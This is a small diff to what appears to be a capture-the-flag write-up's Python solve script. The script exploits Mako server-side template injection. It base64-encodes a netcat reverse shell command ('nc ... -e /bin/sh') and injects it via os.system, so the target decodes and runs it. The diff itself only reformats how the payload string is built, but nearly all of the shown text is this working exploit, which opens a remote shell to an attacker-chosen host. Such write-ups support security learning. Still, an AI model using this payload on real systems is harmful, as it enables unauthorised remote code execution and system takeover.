@@ -30,6 +30,7 @@ from mako.template import Template
 ### Solve:
 
 ```python
+
 import base64
 import requests
 import argparse
@@ -42,7 +43,7 @@ def solve(revshell_ip, revshell_port):
 	rev = f"nc {revshell_ip} {revshell_port} -e /bin/sh"	
 	payload = base64.b64encode(rev.encode('utf-8'))
 	params = {
-		'text': f'${{self.module.runtime.util.os.system("echo {str(payload, "utf-8")} | base64 -d| sh")}}'
+		'text': '${self.module.runtime.util.os.system("echo ' + str(payload, "utf-8") + ' | base64 -d| sh")}'
 	}
  
 	print('\n')
